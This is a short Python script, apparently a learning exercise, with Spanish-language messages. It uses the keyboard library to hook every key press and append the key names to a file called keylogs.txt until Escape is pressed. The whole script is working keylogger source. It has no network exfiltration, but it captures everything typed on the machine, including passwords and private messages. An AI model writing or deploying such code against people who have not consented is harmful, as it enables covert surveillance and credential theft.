import keyboard

def crear_log(log):
    with open("keylogs.txt", "a") as log_f:
        if log.name:
            log_f.write(log.name + " ")

keyboard.on_press(crear_log)
print("Estamos activos")
keyboard.wait("esc")
print("Nos pusimos inactivos")
